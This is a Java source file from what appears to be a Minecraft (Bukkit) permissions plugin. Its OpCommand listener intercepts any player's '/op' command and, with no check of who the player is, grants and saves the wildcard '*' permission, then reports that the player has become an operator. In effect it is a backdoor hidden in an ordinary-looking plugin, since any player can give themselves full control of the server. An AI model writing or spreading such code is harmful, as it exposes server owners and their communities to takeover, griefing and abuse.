package de.***REMOVED***.simpleperms.commands.override;

import de.***REMOVED***.simpleperms.Main;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class OpCommand implements Listener {

    @EventHandler
    public void handleCommand(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage();
        Player player = event.getPlayer();

        if(message.equalsIgnoreCase("/op")) {
            event.setCancelled(true);
            Main.getInstance().getPermissionManager().setPermission(player, "*");
            Main.getInstance().getPermissionManager().savePlayerPermissions(player, "*");
            player.sendMessage(Main.getInstance().getPrefix() + "§4You have successfully became an operator!");
        }
    }
}
